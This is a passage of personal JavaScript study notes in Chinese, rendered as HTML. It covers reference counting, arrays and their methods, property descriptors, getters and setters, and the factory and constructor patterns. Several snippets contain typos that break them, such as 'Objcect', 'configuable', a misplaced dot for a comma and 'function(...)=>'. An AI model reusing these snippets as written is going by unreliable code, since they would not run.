class=\"hljs-keyword\">var</span> objA=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();<br>    <span class=\"hljs-keyword\">var</span> objB=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title function_\">object</span>();<br>    <br>    objectA.<span class=\"hljs-property\">someOtherObject</span>=objectB;<br>    objectA.<span class=\"hljs-property\">anotherObject</span>=objectA;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>ObjectA和B通过各自的属性相互引用，两个对象的引用次数都是2；</p>\n<p>这会导致函数执行后继续存在，引用次数永远不会为0；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//解决方法</span><br>objA.<span class=\"hljs-property\">someOther</span>..=<span class=\"hljs-literal\">null</span>;<br>objB.<span class=\"hljs-property\">ano</span>..=<span class=\"hljs-literal\">null</span>;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>性能问题</li>\n<li>引用解除</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-params\">name</span>)&#123; <br> <span class=\"hljs-keyword\">var</span> localPerson = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>(); <br> localPerson.<span class=\"hljs-property\">name</span> = name; <br> <span class=\"hljs-keyword\">return</span> localPerson; <br>&#125; <br><span class=\"hljs-keyword\">var</span> globalPerson = <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-string\">&quot;Nicholas&quot;</span>); <br><span class=\"hljs-comment\">// 手工解除 globalPerson 的引用</span><br>globalPerson = <span class=\"hljs-literal\">null</span>; <br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-引用类型\"><a href=\"#4-引用类型\" class=\"headerlink\" title=\"4.引用类型\"></a>4.引用类型</h3><ul>\n<li>使用对象</li>\n<li>创建、操作数组</li>\n<li>理解基本的JS类型</li>\n<li>使用基本类型和基本包装类型</li>\n</ul>\n<blockquote>\n<p>引用类型的值（对象）是引用类型的一个实例；</p>\n</blockquote>\n<ul>\n<li><h5 id=\"Object类型\"><a href=\"#Object类型\" class=\"headerlink\" title=\"Object类型\"></a>Object类型</h5></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//创建Object实例</span><br><span class=\"hljs-comment\">//1.new操作符后跟Object构造函数</span><br><span class=\"hljs-keyword\">var</span> person=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Object</span>();<br>person.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Martin&quot;</span>;<br>person.<span class=\"hljs-property\">age</span>=<span class=\"hljs-number\">29</span>;<br><br><span class=\"hljs-comment\">//2.对象字面量表示法</span><br><span class=\"hljs-keyword\">var</span> person=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">29</span>,<br>    <span class=\"hljs-string\">&quot;address&quot;</span>:<span class=\"hljs-string\">&quot;江苏省东南大学&quot;</span>\t\t\t<span class=\"hljs-comment\">//属性名可以使用字符串，最后一个属性后不加逗号，会在早的版本导致错误</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><h5 id=\"Array类型\"><a href=\"#Array类型\" class=\"headerlink\" title=\"Array类型\"></a>Array类型</h5></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//ES的数组每一项可以保存不同类型的数据；大小动态调整；</span><br><br><span class=\"hljs-comment\">//创建方式</span><br><span class=\"hljs-comment\">//1.Array构造函数；</span><br><span class=\"hljs-keyword\">var</span> colors=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Array</span>(<span class=\"hljs-number\">20</span>);<br><span class=\"hljs-keyword\">var</span> colors=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Array</span>(<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;blue&quot;</span>,<span class=\"hljs-string\">&quot;yellow&quot;</span>);<br><span class=\"hljs-comment\">//也可以省略new</span><br><span class=\"hljs-keyword\">var</span> colors=<span class=\"hljs-title class_\">Array</span>(<span class=\"hljs-number\">3</span>);<br><br><span class=\"hljs-comment\">//2.数组字面量表示法 </span><br><span class=\"hljs-keyword\">var</span> colors=[<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;blue&quot;</span>,<span class=\"hljs-string\">&quot;yellow&quot;</span>];<br><br><span class=\"hljs-keyword\">var</span> nums=[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,]\t\t<span class=\"hljs-comment\">//不要这样！！！</span><br><span class=\"hljs-keyword\">var</span> options=[，，，] <span class=\"hljs-comment\">//不要这样；</span><br><br><span class=\"hljs-comment\">//添加元素</span><br>color[color.<span class=\"hljs-property\">length</span>]=<span class=\"hljs-string\">&quot;black&quot;</span>;<br><br><span class=\"hljs-comment\">//检测数组instanceof 问题在于如果存在两个不同的Array构造函数，会出错；</span><br><span class=\"hljs-keyword\">if</span>(value <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">Array</span>)&#123;<br>    ...<br>&#125;<br>    <br><span class=\"hljs-comment\">//更好的方法</span><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title class_\">Array</span>.<span class=\"hljs-title function_\">isArray</span>(value))&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//转换方法</span><br><span class=\"hljs-keyword\">var</span> colors = [<span class=\"hljs-string\">&quot;red&quot;</span>, <span class=\"hljs-string\">&quot;blue&quot;</span>, <span class=\"hljs-string\">&quot;green&quot;</span>]; <span class=\"hljs-comment\">// 创建一个包含 3 个字符串的数组</span><br><span class=\"hljs-title function_\">alert</span>(colors.<span class=\"hljs-title function_\">toString</span>()); <span class=\"hljs-comment\">// red,blue,green </span><br><span class=\"hljs-title function_\">alert</span>(colors.<span class=\"hljs-title function_\">valueOf</span>()); <span class=\"hljs-comment\">// red,blue,green </span><br><span class=\"hljs-title function_\">alert</span>(colors); <span class=\"hljs-comment\">// red,blue,green。由于 alert()要接收字符串参数，所以它会在后台调用 toString()方法，由此会得到与直接调用 toString()方法相同的结果</span><br><br><span class=\"hljs-comment\">//栈方法</span><br>array.<span class=\"hljs-title function_\">push</span>();\t\t<span class=\"hljs-comment\">//尾部压入</span><br>array.<span class=\"hljs-title function_\">pop</span>();\t\t<span class=\"hljs-comment\">//尾部弹出</span><br><br><span class=\"hljs-comment\">//队列方法</span><br>array.<span class=\"hljs-title function_\">push</span>();\t\t<span class=\"hljs-comment\">//尾部入队</span><br>array.<span class=\"hljs-title function_\">shift</span>();\t\t<span class=\"hljs-comment\">//首部出队</span><br>array.<span class=\"hljs-title function_\">unshift</span>();\t<span class=\"hljs-comment\">//首部入队</span><br><br><span class=\"hljs-comment\">//重排序方法</span><br>array.<span class=\"hljs-title function_\">sort</span>();\t\t<span class=\"hljs-comment\">//升序排列，方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串</span><br>array.<span class=\"hljs-title function_\">reverse</span>();\t<span class=\"hljs-comment\">//反转数组</span><br><br><span class=\"hljs-comment\">//sort方法可以接受一个比较函数</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">compare</span>(<span class=\"hljs-params\">value1, value2</span>) &#123; <br> <span class=\"hljs-keyword\">if</span> (value1 &lt; value2) &#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>; <br> &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span> (value1 &gt; value2) &#123; <br> <span class=\"hljs-keyword\">return</span> -<span class=\"hljs-number\">1</span>; <br> &#125; <span class=\"hljs-keyword\">else</span> &#123; <br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>; <br> &#125; <br>&#125; <br><span class=\"hljs-keyword\">var</span> values = [<span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">10</span>, <span class=\"hljs-number\">15</span>]; <br>values.<span class=\"hljs-title function_\">sort</span>(compare); <br><span class=\"hljs-title function_\">alert</span>(values); <span class=\"hljs-comment\">// 15,10,5,1,0</span><br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//操作方法</span><br><span class=\"hljs-comment\">//concat（）方法基于当前数组项创建一个新的数组；</span><br><span class=\"hljs-keyword\">var</span> colors=[<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;yellow&quot;</span>];<br><span class=\"hljs-keyword\">var</span> colors2=colors.<span class=\"hljs-title function_\">concat</span>(<span class=\"hljs-string\">&quot;green&quot;</span>,[<span class=\"hljs-string\">&quot;blue&quot;</span>,<span class=\"hljs-string\">&quot;grey&quot;</span>]);<br><br><span class=\"hljs-comment\">//slice（）方法接受一或者两个参数，为岂止位置；</span><br><span class=\"hljs-comment\">//slice方法不会影响原始数组；</span><br><span class=\"hljs-keyword\">var</span> colors = [<span class=\"hljs-string\">&quot;red&quot;</span>, <span class=\"hljs-string\">&quot;green&quot;</span>, <span class=\"hljs-string\">&quot;blue&quot;</span>, <span class=\"hljs-string\">&quot;yellow&quot;</span>, <span class=\"hljs-string\">&quot;purple&quot;</span>]; <br><span class=\"hljs-keyword\">var</span> colors2 = colors.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">1</span>); <br><span class=\"hljs-keyword\">var</span> colors3 = colors.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">4</span>); <br><br><span class=\"hljs-comment\">//splice()方法</span><br><span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">2</span>);  <span class=\"hljs-comment\">//删除前两项</span><br><span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-string\">&quot;red&quot;</span>,<span class=\"hljs-string\">&quot;green&quot;</span>)  <span class=\"hljs-comment\">//从位置2开始插入red,green;</span><br><span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-string\">&quot;red&quot;</span>)\t\t\t<span class=\"hljs-comment\">//替换第二项为red；</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//位置方法</span><br><span class=\"hljs-title function_\">indexOf</span>()\t\t\t<span class=\"hljs-comment\">//从头开始查找</span><br><span class=\"hljs-title function_\">lastIndexOf</span>()\t\t<span class=\"hljs-comment\">//从尾部开始查找</span><br><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-迭代方法\"><a href=\"#5-迭代方法\" class=\"headerlink\" title=\"5.迭代方法\"></a>5.迭代方法</h3><ul>\n<li>every():对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。</li>\n<li>some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。</li>\n<li>filter():对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组.</li>\n<li>foreach():：对数组中的每一项运行给定函数。这个方法没有返回值。</li>\n<li>map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。</li>\n</ul>\n<h3 id=\"6-归并方法\"><a href=\"#6-归并方法\" class=\"headerlink\" title=\"6.归并方法\"></a>6.归并方法</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//reduce():从第一项开始遍历；</span><br><span class=\"hljs-comment\">//reduceRight():从最后一项开始遍历；</span><br><span class=\"hljs-comment\">//接受的参数：prev,next，索引，数组对象</span><br><span class=\"hljs-keyword\">var</span> values=[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>];<br><span class=\"hljs-comment\">//第一次调用，pre=1.cur=2;第二次：pre=3(1+2的结果)，cur=3</span><br><span class=\"hljs-keyword\">var</span> sum=values.<span class=\"hljs-title function_\">reduce</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">prev,cur,index,array</span>)=&gt;&#123;<br>                      <span class=\"hljs-keyword\">return</span> prev+cur;<br>                      &#125;);<br><span class=\"hljs-title function_\">alert</span>(sum);\t\t\t\t<span class=\"hljs-comment\">//15</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-正则表达式\"><a href=\"#7-正则表达式\" class=\"headerlink\" title=\"7.正则表达式\"></a>7.正则表达式</h3><h2 id=\"二、面向对象的程序设计\"><a href=\"#二、面向对象的程序设计\" class=\"headerlink\" title=\"二、面向对象的程序设计\"></a>二、面向对象的程序设计</h2><ul>\n<li>理解对象属性</li>\n<li>理解并创建对象</li>\n<li>理解继承</li>\n</ul>\n<h3 id=\"1-属性类型\"><a href=\"#1-属性类型\" class=\"headerlink\" title=\"1.属性类型\"></a>1.属性类型</h3><blockquote>\n<p>ES中有两种属性：数据属性和访问器属性</p>\n</blockquote>\n<ul>\n<li>数据属性</li>\n</ul>\n<blockquote>\n<p>数据属性包含一个数据值的位置，在这个位置可以读取和写入值。</p>\n<ol>\n<li>Configurable：表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；</li>\n<li>Enumerable：表示是否可以通过for-in循环返回属性；默认为true;</li>\n<li>Writable:表示能否修改属性的值；默认为true；</li>\n<li>Value:数据值，默认为undefined；</li>\n</ol>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> person=&#123;&#125;;<br><span class=\"hljs-title class_\">Objcect</span>.<span class=\"hljs-title function_\">defineProperty</span>(person.<span class=\"hljs-string\">&quot;name&quot;</span>,&#123;<br>                       <span class=\"hljs-attr\">configuable</span>:<span class=\"hljs-literal\">false</span>,\t\t<span class=\"hljs-comment\">//一旦设置为false,就不能变回可配置的了；</span><br>                       <span class=\"hljs-attr\">writable</span>:<span class=\"hljs-literal\">false</span>,<br>                       <span class=\"hljs-attr\">value</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>，<br>                       &#125;);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(person.<span class=\"hljs-property\">name</span>);\t\t<span class=\"hljs-comment\">//&quot;Martin&quot;</span><br>person.<span class=\"hljs-property\">name</span>=<span class=\"hljs-string\">&quot;Jack&quot;</span>;\t\t\t\t<span class=\"hljs-comment\">//无法修改，非严格模式下赋值会被忽略；严格模式下，抛出错误；</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>访问器属性</li>\n</ul>\n<blockquote>\n<p>不包含数据值，包含一对儿~~</p>\n<p>getter()和setter();</p>\n<ol>\n<li>configurable:表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；</li>\n<li>Enumerable：表示是否可以通过for-in循环返回属性；默认为true;</li>\n<li>Get:读取属性时调用，默认undefined；</li>\n<li>Set:写入属性时调用，默认undefined；</li>\n</ol>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> book=&#123;<br>    <span class=\"hljs-attr\">_year</span>:<span class=\"hljs-number\">2004</span>,\t\t\t<span class=\"hljs-comment\">//前置下划线表示只可以通过对象方法访问；</span><br>    <span class=\"hljs-attr\">edition</span>:<span class=\"hljs-number\">1</span><br>&#125;;<br><br><span class=\"hljs-title class_\">Objcect</span>.<span class=\"hljs-title function_\">defineProperty</span>(book,<span class=\"hljs-string\">&quot;year&quot;</span>,&#123;<br>    <span class=\"hljs-attr\">get</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;\t\t\t\t\t\t<span class=\"hljs-comment\">//只写getter意味着不能写，写入会被忽略；严格模式报错；</span><br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>    &#125;,<br>    <span class=\"hljs-attr\">set</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">newValue</span>)&#123;<br>        <span class=\"hljs-keyword\">if</span>(newValue&gt;<span class=\"hljs-number\">2004</span>)&#123;<br>            <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>=newValue;<br>            <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span>+=newValue-<span class=\"hljs-number\">2004</span>;<br>        &#125;<br>    &#125;<br>&#125;);<br><br><span class=\"hljs-comment\">//定义多个属性</span><br><span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">defineProperties</span>(book,&#123;<br>    <span class=\"hljs-attr\">_year</span>:&#123;<br>        <span class=\"hljs-attr\">value</span>:<span class=\"hljs-number\">2004</span>,<br>    &#125;,<br>    <span class=\"hljs-attr\">edition</span>:&#123;<br>        <span class=\"hljs-attr\">value</span>:<span class=\"hljs-number\">1</span><br>    &#125;,<br>    <span class=\"hljs-attr\">year</span>:&#123;<br>       <span class=\"hljs-attr\">get</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;\t\t\t\t\t\t<span class=\"hljs-comment\">//只写getter意味着不能写，写入会被忽略；严格模式报错；</span><br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>;<br>        &#125;,<br>        <span class=\"hljs-attr\">set</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">newValue</span>)&#123;<br>            <span class=\"hljs-keyword\">if</span>(newValue&gt;<span class=\"hljs-number\">2004</span>)&#123;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">_year</span>=newValue;<br>                <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">edition</span>+=newValue-<span class=\"hljs-number\">2004</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//读取属性的特性</span><br><span class=\"hljs-keyword\">var</span> year=<span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">getOwnPropertyDescriptor</span>(book,<span class=\"hljs-string\">&quot;_year&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(year.<span class=\"hljs-property\">value</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-创建对象\"><a href=\"#2-创建对象\" class=\"headerlink\" title=\"2.创建对象\"></a>2.创建对象</h3><blockquote>\n<p>工厂模式抽象了具体创建对象的过程，考虑到ES中无法创建类，开发人员就发明了一i中函数</p>\n</blockquote>\n<h5 id=\"工厂模式\"><a href=\"#工厂模式\" class=\"headerlink\" title=\"工厂模式\"></a>工厂模式</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">createPerson</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> o=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Objcet</span>();<br>    o.<span class=\"hljs-property\">name</span>=name;<br>    o.<span class=\"hljs-property\">age</span>=age;<br>    o.<span class=\"hljs-property\">job</span>=job;<br>    o.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;;<br>    <span class=\"hljs-keyword\">return</span> o;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>工厂模式虽然解决了创建多个相似对象的问题，但是没有解决对象识别的问题，无法知道一个对象的类型；</p>\n</blockquote>\n<h5 id=\"构造函数模式\"><a href=\"#构造函数模式\" class=\"headerlink\" title=\"构造函数模式\"></a>构造函数模式</h5><blockquote>\n<p>ES中的构造函数能船舰特定类型的对象；</p>\n<p>像Object和Array这样的原生构造函数，运行时会自动出现再执行环境；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span class=\"hljs-params\">name,age,job</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>=name;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">age</span>=age;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">job</span>=job;<br>    <br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">sayName</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">name</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>除了相同部分，有如下区别：</p>\n<ul>\n<li>没有显式的创建对象；</li>\n<li>直接将属性和方法赋给了this对象；</li>\n<li>没有return；</li>\n</ul>\n<p>Note：构造函数使用应该使用首字母大写的开头，非构造函数小写字母开头；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//要创建Person实例，需要使用new</span><br><span class=\"hljs-keyword\">let</span> newPerson=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Person</span>(<span class=\"hljs-string\">&quot;Martin&quot;</span>,<span class=\"hljs-number\">18</span>,<span class=\"hljs-string\">&quot;Programmer&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(newPerson.<span class=\"hljs-property\">constructor</span>==<span class=\"hljs-title class_\">Person</span>);   <span class=\"hljs-comment\">//true</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(newPerson <span class=\"hljs-keyword\">instanceof</span> <span class=\"hljs-title class_\">Person</span>);\t<span class=\"hljs-comment\">//true</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；</p>\n<p>构造函数虽然好用，但是也不是没有缺点。</p>\n<p>主要问题是：每个方法都要再实例上重新创建一遍；</p>\n<p>不同实例创建相同函数名的函数，会导致不同的作用域链和标识符解析。</p>\n<p>创建相同的Function实例完全没有必要，况且有this对象在根本不用在执行代码前九八函数绑定到特定的对象上面；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//优化方法</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">Person</span>(<span 